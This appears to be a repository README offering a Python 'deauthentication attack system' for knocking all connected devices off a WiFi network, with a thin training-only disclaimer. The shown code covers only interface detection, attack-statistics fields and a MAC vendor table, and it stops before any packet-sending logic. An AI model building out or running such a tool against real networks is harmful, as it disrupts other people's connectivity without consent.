# Death-authentication.py-script
Disclamer  this script its just for training and for the simulation machine,

copy this then copy it in python for the run
#!/usr/bin/env python3
# DEAUTH_ATTACK_SYSTEM.py
# Real-time deauthentication attack for all connected devices

import sys
import os
import time
import threading
import queue
import json
from datetime import datetime
from dataclasses import dataclass
from typing import List, Dict, Set
import subprocess

# Platform detection
IS_WINDOWS = sys.platform.startswith('win')
IS_LINUX = sys.platform.startswith('linux')
IS_MAC = sys.platform.startswith('darwin')

@dataclass
class Device:
    mac: str
    ip: str
    vendor: str
    signal_strength: int
    last_seen: datetime
    packets_sent: int = 0

class DeauthAttackSystem:
    def __init__(self, interface=None):
        self.interface = interface or self.detect_interface()
        self.target_bssid = None
        self.target_ssid = None
        self.attacking = False
        self.devices: Dict[str, Device] = {}
        self.attack_threads: List[threading.Thread] = []
        self.packet_queue = queue.Queue()
        
        # Attack statistics
        self.stats = {
            'deauth_sent': 0,
            'devices_discovered': 0,
            'attack_start': None,
            'packets_per_second': 0
        }
        
        self.load_vendor_database()
        print(f"[*] Initialized on interface: {self.interface}")
        print(f"[*] Platform: {'Windows' if IS_WINDOWS else 'Linux' if IS_LINUX else 'Mac'}")
    
    def detect_interface(self):
        """Detect wireless interface"""
        if IS_WINDOWS:
            return self.detect_windows_interface()
        elif IS_LINUX:
            return self.detect_linux_interface()
        else:
            return "wlan0"
    
    def detect_windows_interface(self):
        """Detect WiFi interface on Windows"""
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n'):
                if "Name" in line and ":" in line:
                    return line.split(":")[1].strip()
        except:
            pass
        
        # Try common Windows interface names
        common_interfaces = ["Wi-Fi", "Wireless Network Connection", "wlan0"]
        for iface in common_interfaces:
            try:
                subprocess.run(["netsh", "wlan", "show", "interfaces", iface], 
                             capture_output=True)
                return iface
            except:
                continue
        
        return "Wi-Fi"
    
    def detect_linux_interface(self):
        """Detect WiFi interface on Linux"""
        try:
            result = subprocess.run(["iwconfig"], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "IEEE 802.11" in line:
                    return line.split()[0]
        except:
            pass
        
        # Try common Linux interfaces
        for iface in ["wlan0", "wlan1", "wlp2s0", "wlp3s0"]:
            try:
                subprocess.run(["iwconfig", iface], capture_output=True)
                return iface
            except:
                continue
        
        return "wlan0"
    
    def load_vendor_database(self):
        """Load MAC vendor database"""
        self.vendor_db = {}
        try:
            with open("vendor_mac.json", "r") as f:
                self.vendor_db = json.load(f)
        except:
            # Common vendors for fallback
            self.vendor_db = {
                "00:0C:29": "VMware",
                "00:1A:11": "Google",
                "00:1B:FC": "ASUS",
                "00:1D:60": "TP-Link",
                "00:23:69": "Apple",
                "00:26:18": "NETGEAR",
                "28:16:AD": "Huawei",
                "44:03:2C": "Xiaomi",
                "A4:1F:72": "D-Link",
                "C0:25:E9": "Belkin",
                "F0:9F:C2": "Samsung"
            }
    
    def get_vendor_from_mac(self, mac: str) -> str:
        """Get vendor from MAC address"""
        prefix = mac.replace(":", "").upper()[:6]
        for vendor_prefix, vendor_name in self.vendor_db.items():
            if prefix.startswith(vendor_prefix.replace(":", "")):
                return vendor_name
        return "Unknown"
